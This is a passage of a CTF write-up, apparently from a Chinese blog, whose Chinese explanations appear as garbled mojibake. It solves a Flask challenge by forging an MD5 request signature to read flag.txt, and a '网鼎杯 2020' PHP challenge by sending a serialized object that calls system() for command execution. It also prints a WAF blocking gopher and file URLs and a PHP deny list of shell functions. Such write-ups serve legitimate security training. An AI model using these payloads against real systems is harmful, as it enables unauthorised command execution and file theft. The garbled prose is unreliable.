</span></span><span class=line><span class=cl>                <span class=n>resp</span> <span class=o>=</span> <span class=n>scan</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>param</span><span class=p>)</span>  <span class=c1># æ­¤å¤„æ˜¯æ–‡ä»¶è¯»å–å¾—æ³¨å…¥ç‚¹</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>resp</span> <span class=o>==</span> <span class=s2>&#34;Connection Timeout&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=n>result</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>resp</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span> <span class=n>resp</span>
</span></span><span class=line><span class=cl>                    <span class=n>tmpfile</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>resp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>tmpfile</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>200</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;read&#34;</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>action</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;./</span><span class=si>%s</span><span class=s2>/result.txt&#34;</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>sandbox</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>200</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>result</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=mi>500</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;Action Error&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>500</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span><span class=p>[</span><span class=s1>&#39;msg&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;Sign Error&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>result</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>checkSign</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>getSign</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>action</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>param</span><span class=p>)</span> <span class=o>==</span> <span class=bp>self</span><span class=o>.</span><span class=n>sign</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># generate Sign For Action Scan.</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/geneSign&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>geneSign</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>param</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;param&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>action</span> <span class=o>=</span> <span class=s2>&#34;scan&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>getSign</span><span class=p>(</span><span class=n>action</span><span class=p>,</span> <span class=n>param</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/De1ta&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>challenge</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>action</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;action&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>param</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;param&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sign</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;sign&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ip</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>remote_addr</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>waf</span><span class=p>(</span><span class=n>param</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;No Hacker!!!!&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>task</span> <span class=o>=</span> <span class=n>Task</span><span class=p>(</span><span class=n>action</span><span class=p>,</span> <span class=n>param</span><span class=p>,</span> <span class=n>sign</span><span class=p>,</span> <span class=n>ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>task</span><span class=o>.</span><span class=n>Exec</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;code.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>scan</span><span class=p>(</span><span class=n>param</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>socket</span><span class=o>.</span><span class=n>setdefaulttimeout</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>urllib</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>param</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()[:</span><span class=mi>50</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Connection Timeout&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getSign</span><span class=p>(</span><span class=n>action</span><span class=p>,</span> <span class=n>param</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>secert_key</span> <span class=o>+</span> <span class=n>param</span> <span class=o>+</span> <span class=n>action</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>md5</span><span class=p>(</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>content</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>waf</span><span class=p>(</span><span class=n>param</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>check</span> <span class=o>=</span> <span class=n>param</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>check</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;gopher&#34;</span><span class=p>)</span> <span class=ow>or</span> <span class=n>check</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;file&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>debug</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>ç®€å•è¯´æ˜æ€è·¯ï¼š</p><p>è¯·æ±‚éƒ¨åˆ†(ä»£ç 69-78)ï¼š</p><div class=table-wrapper><table><thead><tr><th>è·å–çš„paramæ˜¯éœ€è¦æ‰“å¼€æ–‡ä»¶çš„åç§°ï¼Œæç¤ºä¸­å·²ç»å†™å‡ºflagåœ¨flag.txtã€‚æ ¹æ®ä½¿ç”¨å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨getä¼ å‚</th></tr></thead><tbody><tr><td>è¯»å–æ–‡ä»¶éœ€è¦åœ¨cookieé‡Œä¼ å…¥å‚æ•°actionã€sign</td></tr><tr><td>actionæ˜¯æ‰§è¡Œç±»å‹ï¼Œä»£ç 33è¡Œå’Œ43è¡ŒæŒ‡å‡ºäº†ä¸¤ç§ã€‚</td></tr><tr><td>singæ˜¯ç”¨æ¥éªŒè¯paramå’Œactionçš„ï¼Œç›¸å…³å‡½æ•°åœ¨94è¡Œï¼Œç¨ååšè§£é‡Š</td></tr></tbody></table></div><p>è·å–signéƒ¨åˆ†(61-66)</p><div class=table-wrapper><table><thead><tr><th>è·å–paramï¼Œactionå›ºå®šä¸ºscan</th></tr></thead><tbody><tr><td>è¿”å›(secert_key + param + action)ç»„åˆçš„sign</td></tr></tbody></table></div><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆè·å–signï¼Œè·å–signæ—¶åŒ…å«çš„paramå’Œactionï¼Œå†å»è¯·æ±‚æ–‡ä»¶è·å¾—flagï¼Œå¹¶ä¸”è·å–flagæ—¶ä¼šéªŒè¯signæ˜¯å¦ç¬¦åˆæ ¼å¼(ä»£ç 32è¡Œã€54-58è¡Œ)ã€‚å› ä¸ºè·å–signæ—¶actionå›ºå®šä¸ºscan(ä»£ç 65)ï¼Œä½†æ˜¯è¯·æ±‚ä¸­æˆ‘ä»¬éœ€è¦ä½¿ç”¨readæ‰å¯ä»¥è®¿é—®ï¼Œæ‰€ä»¥æ„é€ payloadã€‚</p><p>å‡å¦‚param=flag.txtï¼Œè·å–signæ—¶actionå›ºå®šå€¼ä¸ºscanï¼Œæ­¤æ—¶çš„signä¸º(ä½¿ç”¨<code>|</code>ä»…ä¸ºè¯´æ˜ä½¿ç”¨ï¼Œå…¶å®å­—ç¬¦ä¸²æ˜¯ç›¸è¿çš„)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>secert_key|flag.txt|scan
</span></span></code></pre></td></tr></table></div></div><p>ä½†æ˜¯æˆ‘ä»¬æƒ³è¦ä½¿ç”¨readï¼Œå¯ä»¥æ„é€ paramä¸ºflag.txtread</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>secert_key|flag.txtread|scan
</span></span></code></pre></td></tr></table></div></div><p>å†è¿›è¡ŒéªŒè¯çš„æ—¶å€™æˆ‘ä»¬ä¼ å…¥paramä¸ºflag.txtï¼Œactionä¸ºreadscanå³å¯ç¬¦åˆæ ¼å¼ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>secert_key|flag.txt|readscan
</span></span></code></pre></td></tr></table></div></div><p>è¯·æ±‚/geneSign</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/geneSign?param=flag.txtread
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>9017a8826b7267833f22c0f22d90fea7
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°signä»¥åï¼Œå†å»è®¿é—®/De1ta</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/De1ta?param=flag.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sign=9017a8826b7267833f22c0f22d90fea7;action=readscan;
</span></span></code></pre></td></tr></table></div></div><p>è·å¾—flag</p><hr><h1 id=ç½‘é¼æ¯-2020-æœ±é›€ç»„phpweb>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h1><p>çœ‹æºç ï¼Œæœ‰ä¸€ä¸ªè¡¨å•å’Œè‡ªåŠ¨æäº¤çš„jsã€‚è¡¨å•å‚æ•°ä¸º</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>func=date&amp;p=Y-m-d+h%3Ai%3As+a
</span></span></code></pre></td></tr></table></div></div><p>æ˜¯ä¸€ä¸ªè·å–æ—¶é—´çš„å‡½æ•°ã€‚å°è¯•æ³¨å…¥ç‚¹funcæ˜¯å‡½æ•°ï¼Œå°±è¯•è¯•å¸¸è§çš„è¯»å–æ–‡ä»¶å‡½æ•°readfileå¯ä»¥è¯»å–index.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>disable_fun</span> <span class=o>=</span> <span class=n>array</span><span class=p>(</span><span class=s2>&#34;exec&#34;</span><span class=p>,</span><span class=s2>&#34;shell_exec&#34;</span><span class=p>,</span><span class=s2>&#34;system&#34;</span><span class=p>,</span><span class=s2>&#34;passthru&#34;</span><span class=p>,</span><span class=s2>&#34;proc_open&#34;</span><span class=p>,</span><span class=s2>&#34;show_source&#34;</span><span class=p>,</span><span class=s2>&#34;phpinfo&#34;</span><span class=p>,</span><span class=s2>&#34;popen&#34;</span><span class=p>,</span><span class=s2>&#34;dl&#34;</span><span class=p>,</span><span class=s2>&#34;eval&#34;</span><span class=p>,</span><span class=s2>&#34;proc_terminate&#34;</span><span class=p>,</span><span class=s2>&#34;touch&#34;</span><span class=p>,</span><span class=s2>&#34;escapeshellcmd&#34;</span><span class=p>,</span><span class=s2>&#34;escapeshellarg&#34;</span><span class=p>,</span><span class=s2>&#34;assert&#34;</span><span class=p>,</span><span class=s2>&#34;substr_replace&#34;</span><span class=p>,</span><span class=s2>&#34;call_user_func_array&#34;</span><span class=p>,</span><span class=s2>&#34;call_user_func&#34;</span><span class=p>,</span><span class=s2>&#34;array_filter&#34;</span><span class=p>,</span> <span class=s2>&#34;array_walk&#34;</span><span class=p>,</span>  <span class=s2>&#34;array_map&#34;</span><span class=p>,</span><span class=s2>&#34;registregister_shutdown_function&#34;</span><span class=p>,</span><span class=s2>&#34;register_tick_function&#34;</span><span class=p>,</span><span class=s2>&#34;filter_var&#34;</span><span class=p>,</span> <span class=s2>&#34;filter_var_array&#34;</span><span class=p>,</span> <span class=s2>&#34;uasort&#34;</span><span class=p>,</span> <span class=s2>&#34;uksort&#34;</span><span class=p>,</span> <span class=s2>&#34;array_reduce&#34;</span><span class=p>,</span><span class=s2>&#34;array_walk&#34;</span><span class=p>,</span> <span class=s2>&#34;array_walk_recursive&#34;</span><span class=p>,</span><span class=s2>&#34;pcntl_exec&#34;</span><span class=p>,</span><span class=s2>&#34;fopen&#34;</span><span class=p>,</span><span class=s2>&#34;fwrite&#34;</span><span class=p>,</span><span class=s2>&#34;file_put_contents&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>gettime</span><span class=p>(</span><span class=o>$</span><span class=k>func</span><span class=p>,</span> <span class=o>$</span><span class=n>p</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>result</span> <span class=o>=</span> <span class=n>call_user_func</span><span class=p>(</span><span class=o>$</span><span class=k>func</span><span class=p>,</span> <span class=o>$</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>a</span><span class=o>=</span> <span class=n>gettype</span><span class=p>(</span><span class=o>$</span><span class=n>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>$</span><span class=n>a</span> <span class=o>==</span> <span class=s2>&#34;string&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=o>$</span><span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span><span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=n>Test</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>var</span> <span class=o>$</span><span class=n>p</span> <span class=o>=</span> <span class=s2>&#34;Y-m-d h:i:s a&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>var</span> <span class=o>$</span><span class=k>func</span> <span class=o>=</span> <span class=s2>&#34;date&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>function</span> <span class=n>__destruct</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=k>func</span> <span class=o>!=</span> <span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>echo</span> <span class=n>gettime</span><span class=p>(</span><span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=k>func</span><span class=p>,</span> <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=k>func</span> <span class=o>=</span> <span class=o>$</span><span class=n>_REQUEST</span><span class=p>[</span><span class=s2>&#34;func&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>p</span> <span class=o>=</span> <span class=o>$</span><span class=n>_REQUEST</span><span class=p>[</span><span class=s2>&#34;p&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>$</span><span class=k>func</span> <span class=o>!=</span> <span class=n>null</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=k>func</span> <span class=o>=</span> <span class=n>strtolower</span><span class=p>(</span><span class=o>$</span><span class=k>func</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>in_array</span><span class=p>(</span><span class=o>$</span><span class=k>func</span><span class=p>,</span><span class=o>$</span><span class=n>disable_fun</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>echo</span> <span class=n>gettime</span><span class=p>(</span><span class=o>$</span><span class=k>func</span><span class=p>,</span> <span class=o>$</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>die</span><span class=p>(</span><span class=s2>&#34;Hacker...&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=err>?</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>æˆ‘æ²¡æ€è·¯äº†ï¼Œçœ‹çš„ç½‘ä¸Šwpã€‚ä½¿ç”¨äº†ååºåˆ—åŒ–unserializeï¼Œå®åœ¨æ˜¯å¤ªæ–¯å·´æ‹‰è¥¿äº†ã€‚</p><p>å…ˆæ„é€ Testå¯¹è±¡ï¼Œå¯¹è±¡é”€æ¯æ—¶ä¹Ÿä¼šæ‰§è¡Œgettimeå‡½æ•°æ‰§è¡Œpayloadï¼Œè®°å¾—è¦åŠ ä¸€å±‚urlencodeï¼Œä¸ç„¶ä¼šè¢«æ‹¦ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=n>Test</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>var</span> <span class=o>$</span><span class=n>p</span> <span class=o>=</span> <span class=s2>&#34;ls ../../../../&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>var</span> <span class=o>$</span><span class=k>func</span> <span class=o>=</span> <span class=s2>&#34;system&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>s</span><span class=o>=</span><span class=n>new</span> <span class=n>Test</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=n>urlencode</span><span class=p>(</span><span class=n>serialize</span><span class=p>(</span><span class=o>$</span><span class=n>s</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=c1>#unserialize</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>O</span><span class=o>%</span><span class=mi>3</span><span class=n>A4</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>Test</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>A2</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A1</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>p</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A15</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>ls</span><span class=o>+..%</span><span class=mi>2</span><span class=n>F</span><span class=o>..%</span><span class=mi>2</span><span class=n>F</span><span class=o>..%</span><span class=mi>2</span><span class=n>F</span><span class=o>..%</span><span class=mi>2</span><span class=n>F</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A4</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=k>func</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A6</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>system</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>B</span><span class=o>%</span><span class=mi>7</span><span class=n>D</span>
</span></span></code></pre></td></tr></table></div></div><p>wpä½¿ç”¨çš„æ˜¯findæŒ‡ä»¤æ‰¾çš„flagåœ°å€ï¼Œä½†æ˜¯æˆ‘æ‰§è¡Œä»¥åå‡ºç°503ï¼Œåº”è¯¥æ˜¯æœåŠ¡å™¨é˜²ç«å¢™é˜³æ°”è¿‡ç››ï¼Œä½†æ˜¯ä½¿ç”¨lsçš„æ–¹æ³•ä¸€ä¸ªä¸€ä¸ªæ‰¾ä¹Ÿèƒ½æ‰¾å¾—åˆ°ã€‚flagåœ¨/tmp/flagoefiu4r93</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST
